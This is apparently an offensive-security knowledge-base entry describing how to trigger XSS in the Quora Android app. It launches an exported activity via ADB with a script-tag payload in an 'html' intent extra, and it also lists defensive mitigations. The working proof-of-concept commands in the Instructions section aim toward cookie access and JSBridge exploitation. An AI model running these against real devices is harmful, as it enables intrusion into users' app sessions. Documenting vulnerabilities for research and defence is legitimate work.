---
tags:
  - xss
  - android
  - adb
type: procedure
tools:
  - '[[tools/ADB]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/adb-shell]]'
  - '[[commands/am-start-actionbar-xss-alert]]'
platforms:
  - Android
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 6fa89041-1b94-4474-89aa-f50cc33bbdaa
created_at: '2025-12-13T23:52:44.073Z'
updated_at: '2025-12-13T23:52:44.073Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Launch-ActionBarContentActivity-with-Malicious-HTML-via-ADB

## Summary

This procedure launches the Quora Android app's ActionBarContentActivity using ADB to inject a malicious HTML payload, triggering XSS via an unsanitized 'html' intent extra and executing JavaScript in the WebView context of www.quora.com.

## Description

The Quora app exposes activities without proper export restrictions, allowing external intents to pass arbitrary HTML that loads directly into a WebView. This leads to XSS, enabling script execution with access to Quora's domain cookies and JSBridge. Prerequisites include ADB setup and a vulnerable Quora app installed on the target device. Expected outcomes: JavaScript alert confirming exploitation, potential for further payload chaining.

## Requirements

1. Android device with USB debugging enabled and Quora app installed
2. ADB tools installed on host machine with device connected
3. Basic knowledge of Android intents and WebView behavior

## Defense

Defensive measures and detection strategies:

- Restrict activity exports in AndroidManifest.xml (android:exported="false")
- Sanitize all intent extras before loading into WebView (e.g., using Html.fromHtml with sanitization)
- Monitor ADB usage and unexpected app launches via device logs (logcat)

## Objectives

1. Verify XSS vulnerability in exported activity
2. Confirm JavaScript execution context
3. Set stage for advanced JSBridge exploitation

## Instructions

### Step 1: Access Device Shell

**Context**: Establish ADB connection to run shell commands on the target device.

**Command** ([[commands/adb-shell]]):
```bash
adb shell
```

> This opens an interactive shell on the device. Expected output: device shell prompt (e.g., $).

### Step 2: Launch Activity with XSS Payload

**Context**: Start ActionBarContentActivity with intent extras to inject HTML containing a script tag, triggering the alert.

**Command** ([[commands/am-start-actionbar-xss-alert]]):
```bash
am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
```

> The 'am start' command launches the activity. The 'url' extra provides a dummy endpoint, while 'html' delivers the payload. Expected output: Activity starts, WebView renders, and alert(123) pops up.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/adb-shell]]
- [[commands/am-start-actionbar-xss-alert]]

## Tools Used

- [[tools/ADB]]

## Tags

- xss
- android
- webview
